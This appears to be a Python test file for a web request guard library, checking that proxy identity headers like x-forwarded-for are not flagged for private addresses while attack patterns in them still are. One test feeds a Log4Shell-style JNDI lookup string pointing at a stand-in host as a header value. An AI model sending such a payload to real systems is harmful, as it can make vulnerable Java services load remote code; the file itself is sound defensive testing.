from collections.abc import AsyncGenerator

import pytest

from guard_core._utils.detection_config import _DEFAULT_EXCLUDED_HEADERS
from guard_core.handlers.suspatterns_handler import SusPatternsManager
from guard_core.utils import detect_penetration_attempt
from tests.conftest import MockGuardRequest

_PROXY_IDENTITY_HEADERS = (
    "forwarded",
    "x-forwarded-for",
    "x-forwarded-host",
    "x-forwarded-proto",
    "x-real-ip",
    "x-client-ip",
    "x-cluster-client-ip",
    "cf-connecting-ip",
    "true-client-ip",
    "fly-client-ip",
    "x-envoy-external-address",
)

_PROXY_IDENTITY_VALUES = (
    "192.168.65.1",
    "10.0.0.5, 172.16.0.1",
    "localhost",
    "for=127.0.0.1;proto=https",
)


@pytest.fixture(autouse=True)
async def _reset_suspatterns_singleton() -> AsyncGenerator[None, None]:
    original_instance = SusPatternsManager._instance
    original_config = SusPatternsManager._config

    SusPatternsManager._instance = None
    SusPatternsManager._config = None

    yield

    SusPatternsManager._instance = original_instance
    SusPatternsManager._config = original_config


def test_proxy_identity_headers_are_in_default_excluded_headers() -> None:
    assert _DEFAULT_EXCLUDED_HEADERS >= set(_PROXY_IDENTITY_HEADERS)


@pytest.mark.parametrize("header", _PROXY_IDENTITY_HEADERS)
@pytest.mark.parametrize("value", _PROXY_IDENTITY_VALUES)
async def test_proxy_identity_header_address_value_is_not_flagged(
    header: str, value: str
) -> None:
    request = MockGuardRequest(headers={header: value})

    result = await detect_penetration_attempt(request)

    assert result.is_threat is False


@pytest.mark.parametrize("header", _PROXY_IDENTITY_HEADERS)
async def test_proxy_identity_header_still_scans_always_scan_pattern(
    header: str,
) -> None:
    request = MockGuardRequest(headers={header: "${jndi:ldap://evil.example/a}"})

    result = await detect_penetration_attempt(request)

    assert result.is_threat is True
    assert f"Header '{header}'" in result.trigger_info


async def test_non_excluded_header_with_private_address_is_still_flagged() -> None:
    request = MockGuardRequest(headers={"x-not-a-proxy-header": "192.168.65.1"})

    result = await detect_penetration_attempt(request)

    assert result.is_threat is True
